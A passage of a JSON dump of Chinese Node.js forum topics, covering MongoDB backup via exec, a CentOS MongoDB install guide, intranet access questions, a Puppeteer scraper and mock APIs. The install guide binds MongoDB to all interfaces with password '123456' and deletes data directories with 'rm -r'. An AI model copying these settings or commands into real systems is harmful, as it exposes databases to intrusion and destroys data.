127.0.0.1 -d koa -o C:\\\\Users\\\\Administrator\\\\Desktop\\\\koa&#96;, {encoding: &#x27;buffer&#x27;}, (error , stdout, stderr) =&gt; {\n  if (error) throw error;\n  stdout = iconv.decode(stdout, &#x27;gbk&#x27;);\n  stderr = iconv.decode(stderr, &#x27;gbk&#x27;);\n  console.log(stdout);\n  console.log(stderr);  \n});\n\n</code></pre></div>","title":"Nodejs Koa+mongodb实现一键 备份数据库 还原功能数据库功能","last_reply_at":"2019-04-25T02:07:16.013Z","good":false,"top":false,"reply_count":5,"visit_count":1098,"create_at":"2019-04-19T01:42:28.624Z","author":{"loginname":"xiaofenlin","avatar_url":"https://avatars3.githubusercontent.com/u/49425206?v=4&s=120"}},{"id":"5cb9634137faec0ce1d03aeb","author_id":"57cfc5d462b635972cd88434","tab":"ask","content":"<div class=\"markdown-text\"><p>服务：mysql、redis、等等…\n为什么不搭建本地环境：\n\t1.数据量大\n\t2.服务太多\n\t3.好几个项目\n综合以上这些问题，搭建一套本地环境真的工作量太大太低效。所以想问问大家有没有什么好的方式可以直连内网？</p>\n</div>","title":"如何配置本地开发环境直连测试环境服务，不想用ssh转发，多个项目多个配置，太繁琐，求好的建议！","last_reply_at":"2019-04-25T01:19:08.858Z","good":false,"top":false,"reply_count":7,"visit_count":956,"create_at":"2019-04-19T05:57:21.469Z","author":{"loginname":"wuyipeng","avatar_url":"https://avatars3.githubusercontent.com/u/16496721?v=4&s=120"}},{"id":"5cbe7a71a86ae80ce64b2343","author_id":"5689d685c301558265041ce6","tab":"share","content":"<div class=\"markdown-text\"><p>本安装教程系统版本为Linux Centos 7，使用Yum源安装MongoDB</p>\n<h2>Yum源</h2>\n<p><strong>使用</strong>\n概括几个常用的：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 1 安装 \nyum install package  &#x2F;&#x2F; 安装指定的安装包package \n\n&#x2F;&#x2F; 2 更新和升级 \nyum update  &#x2F;&#x2F; 全部更新 \nyum update package  &#x2F;&#x2F; 更新指定程序包package\nyum check-update  &#x2F;&#x2F; 检查可更新的程序 \nyum upgrade package  &#x2F;&#x2F; 升级指定程序包package \n\n&#x2F;&#x2F; 3 查找和显示 \nyum info &#x2F;&#x2F; 列出所有可以安装或更新的包的信息\nyum info package &#x2F;&#x2F;显示安装包信息package \nyum list &#x2F;&#x2F; 显示所有已经安装和可以安装的程序包 \nyum list package  &#x2F;&#x2F; 显示指定程序包安装情况package\nyum search package &#x2F;&#x2F; 搜索匹配特定字符的package的详细信息\n\n&#x2F;&#x2F; 4 删除程序 \nyum remove | erase package  &#x2F;&#x2F; 删除程序包package\nyum deplist package  &#x2F;&#x2F; 查看程序package依赖情况\n\n&#x2F;&#x2F; 5 清除缓存 \nyum clean packages  &#x2F;&#x2F; 清除缓存目录下的软件包 \nyum clean headers &#x2F;&#x2F; 清除缓存目录下的 headers \nyum clean oldheaders &#x2F;&#x2F; 清除缓存目录下旧的 headers \nyum clean, yum clean all  &#x2F;&#x2F; (= yum clean packages; yum clean oldheaders) 清除缓存目录下的软件包及旧的headers\n</code></pre><h2>安装Mongodb</h2>\n<h3>配置系统yum源</h3>\n<h4>1. 创建.repo文件，生成mongodb的源</h4>\n<pre class=\"prettyprint\"><code>vi &#x2F;etc&#x2F;yum.repos.d&#x2F;mongodb-org-4.0.repo\n</code></pre><h4>2. 添加以下配置信息：</h4>\n<pre class=\"prettyprint\"><code>[mongodb-org-4.0]\nname=MongoDB Repository\nbaseurl=https:&#x2F;&#x2F;repo.mongodb.org&#x2F;yum&#x2F;redhat&#x2F;#releasever&#x2F;mongodb-org&#x2F;4.0&#x2F;x86_64&#x2F;\ngpgcheck=1\nenabled=1\ngpgkey=https:&#x2F;&#x2F;www.mongodb.org&#x2F;static&#x2F;pgp&#x2F;server-4.0.asc\n</code></pre><p><strong>详解：</strong></p>\n<pre class=\"prettyprint\"><code>name         # 名称\nbaseurl      # 获得下载的路径\ngpkcheck=1   # 表示对从这个源下载的rpm包进行校验；\nenable=1     # 表示启用这个源。\ngpgkey       # gpg验证\n</code></pre><h4>3. 保存退出</h4>\n<pre class=\"prettyprint\"><code>wq # 退出保存\n</code></pre><h3>使用yum安装MongoDB</h3>\n<h4>1. 安装MongoDB</h4>\n<pre class=\"prettyprint\"><code>sudo yum install -y mongodb-org\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/23/16a47f5b28ccc7fe?w=1192&amp;h=894&amp;f=jpeg&amp;s=213276\" alt=\"安装MongoDB\"></p>\n<h4>2. 验证安装结果</h4>\n<pre class=\"prettyprint\"><code>rpm -qa |grep mongodb\n</code></pre><pre class=\"prettyprint\"><code>rpm -ql mongodb-org-server\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/23/16a47f602d81d242?w=1436&amp;h=768&amp;f=jpeg&amp;s=202441\" alt=\"验证安装结果\"></p>\n<h4>3. 启动MongoDB</h4>\n<p>启动MongoDB服务</p>\n<pre class=\"prettyprint\"><code>systemctl start mongod.service\n</code></pre><p>MongoDB默认端口是27017，查看是否开启</p>\n<pre class=\"prettyprint\"><code>netstat -natp | grep 27017\n</code></pre><p>检查数据库是否安装成功</p>\n<pre class=\"prettyprint\"><code>ps -aux | grep mongod    # 查看数据库的进程是否存在\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/23/16a47f668d37fb57?w=1538&amp;h=836&amp;f=jpeg&amp;s=147429\" alt=\"启动MongoDB\"></p>\n<h4>4. 验证服务开启</h4>\n<pre class=\"prettyprint\"><code>mongo\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/23/16a47f6cfc44f347?w=1576&amp;h=1278&amp;f=jpeg&amp;s=453921\" alt=\"验证服务开启\"></p>\n<h3>常用命令清单</h3>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 1、开启MongoDB\nsudo service mongod start  或者 systemctl start mongod.service  # 开启MongoDB\nsudo chkconfig mongod on  # 加入开机启动\nsudo service mongod restart # 重启MongoDB\n\n&#x2F;&#x2F; 2、关闭MongoDB\nsudo service mongod stop  # 关闭防火墙\n\n&#x2F;&#x2F; 3、卸载MongoDB\nsudo yum erase $(rpm -qa | grep mongodb-org)    # 卸载MongoDB\nsudo rm -r &#x2F;var&#x2F;log&#x2F;mongodb  # 删除日志文件\nsudo rm -r &#x2F;var&#x2F;lib&#x2F;mongo    # 删除数据文件\n</code></pre><h2>远程连接Mongodb</h2>\n<h3>1. 修改配置文件mongodb.conf</h3>\n<pre class=\"prettyprint\"><code>vi &#x2F;etc&#x2F;mongod.conf\n\n# network interfaces\nnet:\n  port: 27017\n  bindIp: 0.0.0.0  # Enter 0.0.0.0,:: to bind to all IPv4 and IPv6 addresses or, alternatively, use the net.bindIpAll setting.\n</code></pre><p><strong>修改绑定ip默认127.0.0.1只允许本地连接， 所以修改为bindIp:0.0.0.0, 退出保存</strong></p>\n<h3>2. 重启mongodb服务</h3>\n<pre class=\"prettyprint\"><code>sudo service mongod restart \n</code></pre><h3>3. 开放对外端口</h3>\n<p><strong>方法一</strong></p>\n<pre class=\"prettyprint\"><code>systemctl status firewalld  # 查看防火墙状态\nfirewall-cmd --zone=public --add-port=27017&#x2F;tcp --permanent # mongodb默认端口号\nfirewall-cmd --reload  # 重新加载防火墙\n\nfirewall-cmd --zone=public --query-port=27017&#x2F;tcp # 查看端口号是否开放成功，输出yes开放成功，no则失败\n</code></pre><p><strong>方法二</strong></p>\n<pre class=\"prettyprint\"><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 27017 -j ACCEPT\n</code></pre><h3>4. 远程连接</h3>\n<p><strong>默认连接</strong></p>\n<pre class=\"prettyprint\"><code>mongo 10.128.218.14:27017\n</code></pre><p><strong>连接到自定义的用户</strong></p>\n<ol>\n<li>创建用户，设置账号，密码，权限</li>\n</ol>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; admin数据库\n&gt; use admin\nswitched to db admin\n&gt; db.createUser({ user:&quot;root&quot;, pwd:&quot;123456&quot;, roles:[&quot;root&quot;] })\nSuccessfully added user: { &quot;user&quot; : &quot;root&quot;, &quot;roles&quot; : [ &quot;root&quot; ] }\n\n&#x2F;&#x2F; 其他数据库\n&gt; use test\nswitched to db test\n&gt; db.createUser({ user:&quot;admin&quot;, pwd:&quot;123456&quot;, roles:[&quot;readWrite&quot;, &quot;dbAdmin&quot;] })\nSuccessfully added user: { &quot;user&quot; : &quot;root&quot;, &quot;roles&quot; : [ &quot;root&quot; ] }\n</code></pre><ol>\n<li>修改mongodb.conf文件，启用身份验证</li>\n</ol>\n<pre class=\"prettyprint\"><code>vi &#x2F;etc&#x2F;mongod.conf\n\nsecurity:\n  authorization: &quot;enabled&quot;   # disable or enabled\n</code></pre><ol>\n<li>重启MongoDB</li>\n</ol>\n<pre class=\"prettyprint\"><code>sudo service mongod restart \n</code></pre><ol>\n<li>用户认证</li>\n</ol>\n<pre class=\"prettyprint\"><code>&gt; use admin\nswitched to db admin\n&gt; db.auth(&quot;root&quot;, &quot;123456&quot;)\n1 &#x2F;&#x2F; 授权成功\n</code></pre><pre class=\"prettyprint\"><code>&#x2F;&#x2F; 其他常用命令\ndb.updateUser(user, writeConcern) # 更新用户\ndb.dropUser(&#x27;test&#x27;) # 删除用户\n</code></pre><ol>\n<li>远程连接</li>\n</ol>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 终端连接\nmongo 10.128.218.14:27017:27017&#x2F;database -u username -p password\n\n&#x2F;&#x2F; mongoose方式连接\nmongoose.connect(&#x27;mongodb:&#x2F;&#x2F;username:password@host:port&#x2F;database?options...&#x27;, {useNewUrlParser: true});\n\n&#x2F;&#x2F; 通过客户端连接\n</code></pre><h3>用户权限角色说明</h3>\n<table>\n<thead>\n<tr>\n<th>规则</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>root</td>\n<td>只在admin数据库中可用。超级账号，超级权限</td>\n</tr>\n<tr>\n<td>Read</td>\n<td>允许用户读取指定数据库</td>\n</tr>\n<tr>\n<td>readWrite</td>\n<td>允许用户读写指定数据库</td>\n</tr>\n<tr>\n<td>dbAdmin</td>\n<td>允许用户在指定数据库中执行管理函数，如索引创建、删除，查看统计或访问system.profile</td>\n</tr>\n<tr>\n<td>userAdmin</td>\n<td>允许用户向system.users集合写入，可以找指定数据库里创建、删除和管理用户</td>\n</tr>\n<tr>\n<td>clusterAdmin</td>\n<td>只在admin数据库中可用，赋予用户所有分片和复制集相关函数的管理权限</td>\n</tr>\n<tr>\n<td>readAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的读权限</td>\n</tr>\n<tr>\n<td>readWriteAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的读写权限</td>\n</tr>\n<tr>\n<td>userAdminAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的userAdmin权限</td>\n</tr>\n<tr>\n<td>dbAdminAnyDatabase</td>\n<td>只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限</td>\n</tr>\n</tbody>\n</table>\n<h1>参考文献</h1>\n<ul>\n<li><a href=\"https://blog.csdn.net/u011305680/article/details/52767230\">yum使用详解</a></li>\n<li><a href=\"https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/\">Install MongoDB Community Edition on Red Hat Enterprise or CentOS Linux</a></li>\n<li><a href=\"https://www.linuxidc.com/Linux/2017-11/148495.htm\">CentOS 7上MongoDB数据库安装和卸载</a></li>\n<li><a href=\"https://www.jianshu.com/p/03aff57dfe46\">ubuntu mongodb远程连接配置</a></li>\n<li><a href=\"https://medium.com/mongoaudit/how-to-enable-authentication-on-mongodb-b9e8a924efac\">How to Enable Authentication on MongoDB</a></li>\n<li><a href=\"https://docs.mongodb.com/manual/reference/method/db.createUser/\">db.createUser()</a></li>\n</ul>\n</div>","title":"Linux Centos 7安装MongoDB（简单！详细！）","last_reply_at":"2019-04-25T01:11:27.006Z","good":false,"top":false,"reply_count":3,"visit_count":427,"create_at":"2019-04-23T02:37:37.274Z","author":{"loginname":"vincentSea","avatar_url":"https://avatars0.githubusercontent.com/u/16203604?v=4&s=120"}},{"id":"5cc07e5137faec0ce1d0632b","author_id":"5c82a91cacb681372d416622","tab":"ask","content":"<div class=\"markdown-text\"><p>cnode发帖回复的API不能用吗？？</p>\n</div>","title":"cnode发帖回复的API不能用吗？？","last_reply_at":"2019-04-25T00:48:57.237Z","good":false,"top":false,"reply_count":1,"visit_count":294,"create_at":"2019-04-24T15:18:41.644Z","author":{"loginname":"Mr-Jas","avatar_url":"https://avatars0.githubusercontent.com/u/38638603?v=4&s=120"}},{"id":"5c3c64413898674067a7f08e","author_id":"5c2ec7f75bf06c5e7e3f10e8","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FpV4S_2ag6p2eXKV4-hJa6dJMQWd\" alt=\"33333.jpg\">\nNodejs入门+进阶+即时通讯聊天系统实战视频教程，HTML5+AJAX+Node.js+Express+MySQL的组合开发Web聊天应用</p>\n<p><strong>Nodejs入门+进阶</strong>\n<img src=\"//static.cnodejs.org/FnWFg39SGKc4dMNZECu8ZtTu69kP\" alt=\"11111.jpg\"></p>\n<p><strong>Nodejs即时通讯聊天系统实战14讲</strong>\n<img src=\"//static.cnodejs.org/FsvCVzUJo9SPCyujbQ8EFB2nZt_5\" alt=\"22222.jpg\"></p>\n<p>教程下载：<a href=\"https://www.sucaihuo.com/video/231.html\">https://www.sucaihuo.com/video/231.html</a></p>\n</div>","title":"Nodejs入门+进阶+即时通讯聊天系统实战视频教程","last_reply_at":"2019-04-24T14:45:02.656Z","good":false,"top":false,"reply_count":4,"visit_count":1722,"create_at":"2019-01-14T10:28:17.912Z","author":{"loginname":"missheying","avatar_url":"https://avatars3.githubusercontent.com/u/46346806?v=4&s=120"}},{"id":"5cc074bc37faec0ce1d062ee","author_id":"57cfc5d462b635972cd88434","tab":"ask","content":"<div class=\"markdown-text\"><p>背景：\n因为服务实在太多，在本地搭建一套费时费力还影响电脑性能，所以想直连测试环境，测试环境在内网，终端访问需要通过跳板机操作。</p>\n<p>尝试过的解决方案：\n1.开白名单：运维说出现了安全问题，所以关闭了访问，再加上人手不够，运维当下没时间想其它办法解决此问题。\n2.ssh 端口转发：mysql、redis、其它第三方服务都能连了，结果redis cluster却使用不了了，用的是ioredis包，泪崩中。。。\n3.ssr：经了解，ssr只能代理http或者socket数据，mysql redis 这种tcp连接的不知道能不能代理\n4.修改代码：感觉这种方法也不太好。</p>\n<p>实在是想不出其它的方法能够解决这个问题，还望各位走过路过，留下一点小小的建议，感激不尽，如果有好建议的，麻烦写个简短的步骤，或者多加一两句描述，我好有方向去学习探索。</p>\n<p>谢谢，弯腰，鞠躬！</p>\n</div>","title":"开发环境中有什么方式可以连内网服务（mysql、redis...），有这种代理吗？","last_reply_at":"2019-04-24T14:37:48.635Z","good":false,"top":false,"reply_count":0,"visit_count":417,"create_at":"2019-04-24T14:37:48.635Z","author":{"loginname":"wuyipeng","avatar_url":"https://avatars3.githubusercontent.com/u/16496721?v=4&s=120"}},{"id":"5cc06c1f37faec0ce1d0629f","author_id":"5aab840e19b2e3db18959e5b","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li><a href=\"https://github.com/wszgrcy/ng-window\">github地址</a></li>\n<li>主体部分基于angular开发的一个可视化窗口页面,当然,估计也有很多类似的成品了,所以估计也没那么吸引人,但是因为搜索了下.好像没人拿angular开发,所以写了这个项目</li>\n<li>同时还支持web-component封装的组件引入作为一个独立应用,也搞定了angular模块的懒加载</li>\n<li>想写这个的项目时候,想的挺好的,可以越接近完成,越感觉自己做的东西没意义.但是东西既然做了,还是有始有终把…</li>\n<li>文档写了一大部分(有什么需要了解的可以提出来),<a href=\"https://wszgrcy.github.io/ng-window/\">demo网站</a>也架好了</li>\n<li>e2e写了一部分,单元由于没想好怎么测(基于ngrx的状态管理),还没付出行动.</li>\n<li>反正是大家多多批评把,估计也没啥优点,这个人别的没有,也就是抗击打能力强</li>\n</ul>\n</div>","title":"基于angular框架开源了一个窗口化的页面","last_reply_at":"2019-04-24T14:01:03.003Z","good":false,"top":false,"reply_count":0,"visit_count":420,"create_at":"2019-04-24T14:01:03.003Z","author":{"loginname":"wszgrcy","avatar_url":"https://avatars3.githubusercontent.com/u/9607121?v=4&s=120"}},{"id":"5cc04ceaa86ae80ce64b3819","author_id":"56b8352e71204e03637a385f","tab":"share","content":"<div class=\"markdown-text\"><p>最近需要跟踪竞争对手网站上的信息，公开的接口带了 sign 加密验证，无奈只有使用 puppeteer 来获取网页上所有加密的 接口列表，找了下网上的滚动加载更多，都不是很理想，自己翻了一遍官网 API 写了个出来，或许可以帮助到别人。\n···\nconst puppeteer = require(‘puppeteer’)\nconst EventProxy = require(‘eventproxy’)\nconst ep = new EventProxy()\nlet browser</p>\n<p>main()\nasync function main () {\nbrowser = await openBrowser()</p>\n<p>const ps = []\nfor (let index = 10; index &gt;= 1; index–) {\nlet request_url = <code>demoUrl=${index}</code>\nps.push(spiderPage(request_url))\n}\nawait Promise.all(ps)\nep.after(‘pageFinished’, ps.length, async rs =&gt; {\nawait browser.close()\n})\n}</p>\n<p>async function openBrowser () {\nlet args = [\n’–no-sandbox’,\n’–disable-infobars ‘, // don’t show information bar\n’–window-size=1920,1080’, // resize window view port size\n’–lang=zh-CN’,\n’–disable-dev-shm-usage’\n]</p>\n<p>const browser = await puppeteer.launch({\ndefaultViewport: { width: 375, height: 812 },\nignoreHTTPSErrors: true,\nheadless: false,\ndevtools: true,\ntimeout: 0,\nargs\n})\nreturn browser\n}</p>\n<p>async function spiderPage (request_url) {\nconst page = await openPageToUrl(request_url)\nep.on(<code>${request_url}_response</code>, async rs =&gt; {\nawait sleep(200)\nawait pageScroll(page)\nif (rs.data.productList.list.length != 20) {\nconsole.log(request_url, ‘finished’)\nawait page.screenshot({ path: <code>${request_url.split('?')[1]}.png</code>, fullPage: true })\nawait page.close()\nep.emit(‘pageFinished’)\n}\n})\n}</p>\n<p>async function openPageToUrl (request_url) {\nconst page = await browser.newPage()</p>\n<p>await page.goto(request_url, { waitUntil: ‘domcontentloaded’ }).catch(err =&gt; console.log(err))</p>\n<p>page.on(‘request’, request =&gt; {\n// console.log(‘request’, request._url)\nconst url = request._url\nif (url.indexOf(‘yourTargetUrl’) != -1) {\n// console.log(‘request’, url, ‘page stop scroll’)\n}\n})</p>\n<p>page.on(‘response’, async response =&gt; {\n// console.log(‘request’, request._url)\nconst url = response._url\nif (url.indexOf(‘yourTargetUrl’) != -1) {\nconst rs = await response.json()\nconsole.log(‘response’, url, ‘page start scroll’, rs.data.productList.list.length)\n// console.log(rs.data.productList.list.length)\nep.emit(<code>${request_url}_response</code>, rs)\n}\n})\nreturn page\n}</p>\n<p>async function pageScroll (page) {\nawait page.evaluate(mValues =&gt; {\n// const scrollY = window.innerHeight\nconst scrollY = document.body.clientHeight\nwindow.scrollTo(0, scrollY)\n})\nawait sleep(300)\n}</p>\n<p>// 延时函数\nfunction sleep (delay) {\nreturn new Promise((resolve, reject) =&gt; {\nsetTimeout(() =&gt; {\ntry {\nresolve(1)\n} catch (e) {\nreject(0)\n}\n}, delay)\n})\n}\n···</p>\n</div>","title":"puppeteer 滚动控制研究","last_reply_at":"2019-04-24T11:47:54.480Z","good":false,"top":false,"reply_count":0,"visit_count":300,"create_at":"2019-04-24T11:47:54.480Z","author":{"loginname":"yhc-yhc","avatar_url":"https://avatars1.githubusercontent.com/u/16659510?v=4&s=120"}},{"id":"5cbfffc337faec0ce1d05e65","author_id":"5cb09961207b2365936ec7e3","tab":"ask","content":"<div class=\"markdown-text\"><p>现在只能把路由请求单独打印，console.log又分别分行打印</p>\n</div>","title":"morgan日志库可以把路由信息打印和这次路由里面的console.log打印在一行嘛","last_reply_at":"2019-04-24T06:18:43.417Z","good":false,"top":false,"reply_count":0,"visit_count":301,"create_at":"2019-04-24T06:18:43.417Z","author":{"loginname":"silemelon","avatar_url":"https://avatars2.githubusercontent.com/u/6167490?v=4&s=120"}},{"id":"5cbffa5aa86ae80ce64b333b","author_id":"59b0fced1b37e54f6793c3d6","tab":"ask","content":"<div class=\"markdown-text\"><p>谁能帮我分析下为什么会提示“There may be long-running asynchronous activities”？\n<a href=\"https://upload.clinicjs.org/public/659e885064403fc05deeec5dc435f90aed50d7f04d0b9eb11c2cdfa8e6636752/15124.clinic-bubbleprof.html\"></a><a href=\"https://upload.clinicjs.org/public/659e885064403fc05deeec5dc435f90aed50d7f04d0b9eb11c2cdfa8e6636752/15124.clinic-bubbleprof.html\">https://upload.clinicjs.org/public/659e885064403fc05deeec5dc435f90aed50d7f04d0b9eb11c2cdfa8e6636752/15124.clinic-bubbleprof.html</a></p>\n<p><a href=\"https://upload.clinicjs.org/public/1d53f2c6bfbb6c3aa2bb8aa656fbd8281813ba54b9b213d171666934bd985be5/19848.clinic-doctor.html\"></a><a href=\"https://upload.clinicjs.org/public/1d53f2c6bfbb6c3aa2bb8aa656fbd8281813ba54b9b213d171666934bd985be5/19848.clinic-doctor.html\">https://upload.clinicjs.org/public/1d53f2c6bfbb6c3aa2bb8aa656fbd8281813ba54b9b213d171666934bd985be5/19848.clinic-doctor.html</a></p>\n</div>","title":"NODEJS 性能测试图，寻找项目中的性能问题。","last_reply_at":"2019-04-24T05:55:38.746Z","good":false,"top":false,"reply_count":0,"visit_count":472,"create_at":"2019-04-24T05:55:38.746Z","author":{"loginname":"xulayen","avatar_url":"https://avatars1.githubusercontent.com/u/15044564?v=4&s=120"}},{"id":"567f79d13382febf21134115","author_id":"567f6ba675ab905822046691","tab":"ask","content":"<div class=\"markdown-text\"><h3>使用版本</h3>\n<h2>node 5.0.0\nmulter 1.1.0</h2>\n<p>在跟着这个教程<a href=\"https://github.com/nswbmw/N-blog/\">https://github.com/nswbmw/N-blog/</a>走的时候，到图片上传这一部分卡住了，因为mongodb跟node都是最新版，所以在走教程的时候提到的第三方模块也都是用的最新版，但是一直报<strong>Unexpected field</strong>的错，实在是没能力调了，有没有大神愿意帮个忙，感激涕零。</p>\n<pre class=\"prettyprint\"><code>var multer = require(&#x27;multer&#x27;),\n    upload = multer({ dest: &#x27;.&#x2F;public&#x2F;images&#x2F;&#x27; });\n...\n app.post(&#x27;&#x2F;upload&#x27;, upload.array(&#x27;photos&#x27;, 5), function (req, res) {\n        console.log(&#x27;funny this&#x27;);\n        console.log(req.files);\n        req.flash(&#x27;success&#x27;, &#x27;文件上传成功!&#x27;);\n        res.redirect(&#x27;&#x2F;upload&#x27;);\n    });\n</code></pre><p>代码地址<a href=\"https://github.com/jhonny-me/nodejs-blog1\">https://github.com/jhonny-me/nodejs-blog1</a>.</p>\n</div>","title":"multer 报错Unexpected field，新人求助","last_reply_at":"2019-04-24T04:26:24.446Z","good":false,"top":false,"reply_count":10,"visit_count":8789,"create_at":"2015-12-27T05:40:33.759Z","author":{"loginname":"jhonny-me","avatar_url":"https://avatars.githubusercontent.com/u/9820374?v=3&s=120"}},{"id":"5cbfdf88a86ae80ce64b3215","author_id":"5caaad037edd13064e053135","tab":"ask","content":"<div class=\"markdown-text\"><p>水水水水水</p>\n</div>","title":"jngjdnsndsadsda","last_reply_at":"2019-04-24T04:01:12.956Z","good":false,"top":false,"reply_count":0,"visit_count":234,"create_at":"2019-04-24T04:01:12.956Z","author":{"loginname":"lixingzhe","avatar_url":"https://avatars2.githubusercontent.com/u/49380617?v=4&s=120"}},{"id":"5cbfdeae37faec0ce1d05c5c","author_id":"5a0d348fe2f4b8ea22496498","tab":"share","content":"<div class=\"markdown-text\"><h3>MOCK API 的定义</h3>\n<p>根据百度百科的定义，mock测试就是在测试过程中，对于某些不容易构造或者不容易获取的对象，用一个虚拟的对象来创建以便测试的测试方法。这个虚拟的对象就是mock对象，mock对象就是真实对象在调试期间的代替品。</p>\n<p>在瀑布流开发模式中，如果前端开发人员需要进行页面对接，需要后端先完成API的开发工作，如果没有mock，那么前后端开发的进度会互相影响。</p>\n<p>通过 Mock API事先编写好 API 的数据生成规则，由工具动态生成 API 的返回数据。开发人员通过访问 Mock API 来获得页面所需要的数据，就可以轻松地完成对接工作。</p>\n<h3>MOCK API 能用来解决什么？</h3>\n<h4>1.依赖的接口尚未开发完成</h4>\n<p>在系统交互双方定义好接口之后，我们可以提前进行开发和测试，并不依赖上游系统的开发实现。</p>\n<h4>2.自定义返回测试结果（比如 HttpservletRequet、JDBC 对象等）</h4>\n<p>在测试时使用Mock，可以自由方便的构建配置接口对象的信息参数；</p>\n<p>在测试过程中，需要第三方接口返回特定的数据以符合特定的测试场景，这种情况往往需要跨条线的沟通协调测试数据，成本高，效率低；利用Mock可以自定义返回测试结果，支持手动构造依赖接口的返回值。（这个功能将在后面重点提及）</p>\n<h4>3.自动化测试</h4>\n<p>在自动化测试概念和发展要求下，自动化测试的规模也逐渐增大到一定程度；</p>\n<p>大型业务系统下测试接口多，测试用例也日益增多，依赖环境的稳定就成为了自动化测试执行的关键所在；</p>\n<p>自动化测试过程中，经常会因为依赖的第三方环境不稳定，导致测试执行失败，长期以往的出现问题，导致测试人员对自动化的稳定运行失去维护的信心；</p>\n<p>利用Mock技术，在测试过程中，只关注被测业务逻辑，mock掉依赖不相关的系统，这种情况下自动化测试运行失败，就一定是被测系统本身的业务逻辑问题，而不是第三方系统、数据的问题；</p>\n<h4>4.更多场景，欢迎看客老爷补充。</h4>\n<h3>应用场景示例（自定义返回结果）</h3>\n<p><strong>接下来我们从测试的层面举个场景：</strong></p>\n<p>我所在的项目是企业管理咨询，项目最经常需要的是根据企业详情判断返回不同的状态。涉及到的数据其实很多，但是为了方便举例，我计划写三个接口进行演示，第一个是登录，第二个是获取企业详情，简化了复杂的判断，直接用判断corpld(企业ID)来作为识别的凭证，第三个是设置企业状态，有注销和恢复两种状态。会根据企业的corpstatus进行判断。接下来带你一一设置：</p>\n<p><img src=\"//static.cnodejs.org/FsvsQT0Ji46FoWAxIPoP3SP1rc8p\" alt=\"1.png\"></p>\n<p>登陆接口不必多讲，我们直接到第二个接口，新建一个期望，请求触发条件不写，在返回数据这里添加corpstatus可能值为1或者2。</p>\n<p><img src=\"//static.cnodejs.org/FiqckbnQv7J373XAvJKrJyYC9TeN\" alt=\"2.png\"></p>\n<p>第三个接口是设置企业状态（注销/恢复），这里需要两个请求参数，第一个是corpld企业ID，对应上个接口的corpld;第二个是corpstatus企业状态，这里引用了全局变量，用两对花括号表示。</p>\n<p><img src=\"//static.cnodejs.org/Fl4SwKbp6bW14B1lDj3BpwLU_4RJ\" alt=\"3.png\"></p>\n<p>还是进入mockapi新建期望，因为这里有两个状态（注销/恢复），所以需要写两个期望。当请求参数corpstatus=4条件触发时，返回参数content=注销成功；当请求参数corpstatus=2条件触发时，返回参数content=企业已恢复。</p>\n<p><img src=\"//static.cnodejs.org/FibfQynEwD02xPyyJ7vZ_HU2GBsY\" alt=\"4.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fj8xfvVMU2ymnhm9yU6Y102R_T2H\" alt=\"5.png\"></p>\n<p>由于这三个接口都是应用在一个场景里面的，我们不妨用一个流程进行测试的，总共三个测试用例：</p>\n<ol>\n<li>登陆</li>\n<li>获取企业详情</li>\n<li>设置企业状态（注销/恢复）</li>\n</ol>\n<p>在测试前需要在第二个用例中要写好一个响应预处理，通过Javascript代码动态改变返回的结果，实现corpstatus=2或者4，从而对应上之前的全局变量。</p>\n<p><img src=\"//static.cnodejs.org/Fjgc942kOqRWBUgFO3PcdcgZ2gMG\" alt=\"6.png\"></p>\n<p>然后就可以点击进行测试。从测试记录可以看到会根据corpstatus的不同返回了不同的信息。</p>\n<p><img src=\"//static.cnodejs.org/FsLbDR8G-GTbsSW2eBv3wcxLLKTC\" alt=\"7.png\"></p>\n<p><img src=\"//static.cnodejs.org/FmQHlqPKINJm5PHaykoi70znlGfG\" alt=\"8.png\"></p>\n<p>这就是一个简略完整的一个场景用例设计。那如果没有mockapi的话，等着后端开发，corpstatus可能就拿不到，进度势必会被影响，为了模拟数据测试，这时候mockapi的优势就凸显了。</p>\n<p><strong>下面再讲一个使用mock自定义功能的项目场景：</strong></p>\n<p>之前所在公司子系统较多，我们为了减低集成和维护成本，采用了ESB的架构。ESB架构可以解决多个应用系统互联所面临的的复杂性。也是因为子系统较多导致整个业务系统的运转比较复杂，其中便涉及到和多个外部系统的对接及数据交互，比如仓储和物流，势必会跟EMS、顺丰等有数据交互。</p>\n<p>当然，跟外部系统对接时系统间的联调测试必不可少，有些外部系统提供测试环境，有些甚至不提供。即便是提供测试环境的外部系统，一般也仅在开发联调阶段配合提供联调测试对接服务，一旦联调测试结束，也不再继续提供测试服务。</p>\n<p>那么，当这些外部系统的联调测试环境不可用时，我们就需模拟这些外部系统来和自己的系统进行数据交互，以便支持完整业务测试流程的正常进行。</p>\n<p>再具体到API开发层面的话，就是开发的API经常遇到在URL一样的情况下，需要根据请求头或者请求体的不同，返回不同测试结果。以前没用mockapi自定义的功能的话，解决的方式只有新建多个接口分别进行，十分麻烦。</p>\n<p>举个例子，在API文档建立后，在进行测试时，我的要求是在URL一样的情况下，根据不同的请求头部返回不同结果。</p>\n<p>1.当标签头部\nContest-type=application/json\nClientld=purchase.consemer\nOperationCode= medicine.purchase.consemer.List</p>\n<p>那么返回参数\nFloor=2\nRoom=2\nCabinet=2</p>\n<p>2.当标签头部\nContest-type=application/json1\nClientld=purchase.consemer1\nOperationCode= medicine.purchase.consemer.List1</p>\n<p>那么返回参数\nFloor=3\nRoom=3\nCabinet=3</p>\n<p><strong>使用 eolinker 进行自定义 MOCK API？</strong>\neolinker 是一款接口管理工具，提供API管理、测试功能，本次我们使用它来进行 Mock 